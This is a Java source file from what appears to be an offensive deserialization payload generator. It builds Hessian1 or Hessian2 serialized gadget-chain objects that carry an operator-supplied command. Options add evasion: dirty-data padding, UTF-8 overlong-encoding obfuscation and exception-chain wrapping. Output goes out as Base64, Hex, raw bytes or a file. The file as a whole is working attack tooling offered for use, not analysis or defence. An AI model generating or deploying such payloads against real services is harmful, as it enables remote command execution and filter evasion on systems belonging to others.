package cn.butler.hessian.config;

import cn.butler.payloads.ObjectPayload;
import cn.butler.hessian.Serializer;
import cn.butler.utils.FileUtils;
import cn.butler.payloads.config.Config;
import cn.butler.yso.payloads.util.DirtyDataWrapper;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.codec.binary.Hex;
import org.apache.shiro.lang.codec.Base64;

public class HessianConfig extends Config {
    private boolean isCompress = false;

    public boolean isCompress() {
        return isCompress;
    }

    public void setCompress(boolean compress) {
        isCompress = compress;
    }

    public void parse(CommandLine cmdLine){

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("HessianAttack",payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);

            if(cmdLine.hasOption("dirt-data-length")){
                int dirtDataLength = Integer.valueOf(cmdLine.getOptionValue("dirt-data-length"));
                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(object,dirtDataLength);
                object = dirtyDataWrapper.doWrap();
            }

            //hessian1/hessian2和except和utf8-bytes-mix模式构造
            byte[] serialize = null;
            final String hessianType = cmdLine.getOptionValue("hessianType");
            final boolean utf8bytesmix = cmdLine.hasOption("utf8-bytes-mix");
            final boolean hessianExcept = cmdLine.hasOption("hessianExcept");
            //如果是Hessian1的序列化方式
            if((hessianType != null) && hessianType.equals("Hessian1")){
                //Hessian1不存在hessianExcept异常链构造
//                if(hessianExcept){
//                    //如果是Hessian需要UTF8 Overlong Encoding混淆
//                    if(utf8bytesmix){
//                        serialize = Serializer.serialize1ExceptUTF8BytesMix(object);
//                    }else {
//                        serialize = Serializer.serialize1Except(object);
//                    }
//                }
                if(utf8bytesmix){
                    serialize = Serializer.serialize1UTF8BytesMix(object);
                }else {
                    serialize = Serializer.serialize1(object);
                }
            //如果是Hessian2的序列化方式
            }else if ((hessianType != null) && hessianType.equals("Hessian2")){
                //如果是hessianExcept异常链构造
                if(hessianExcept){
                    //如果是Hessian需要UTF8 Overlong Encoding混淆
                    if(utf8bytesmix){
                        serialize = Serializer.serializeExceptUTF8BytesMix(object);
                    }else {
                        serialize = Serializer.serializeExcept(object);
                    }
                }else {
                    if(utf8bytesmix){
                        serialize = Serializer.serializeUTF8BytesMix(object);
                    }else {
                        serialize = Serializer.serialize(object);
                    }
                }
            }
            //编码输出
            if(cmdLine.hasOption("encode")){
                String encodeResult = "Currently only supports Base64 and Hex encoding";
                String encodeType = cmdLine.getOptionValue("encode");
                if(encodeType.equals("Base64")){
                    encodeResult = Base64.encodeToString(serialize);
                } else if (encodeType.equals("Hex")) {
                    encodeResult = Hex.encodeHexString(serialize).toUpperCase();
                }
                System.out.println(encodeResult);
                System.exit(0);
            }
            //字节写入到文件
            if (cmdLine.hasOption("writeToFile")){
                String fileName = cmdLine.getOptionValue("writeToFile");
                FileUtils.saveBytePayloadToFile(serialize,fileName);
                System.exit(0);
            }
            //原版的输出
//            PrintStream out = System.out;
//            Serializer.serialize(object, out);
            System.out.write(serialize,0,serialize.length);
            ObjectPayload.Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }
}
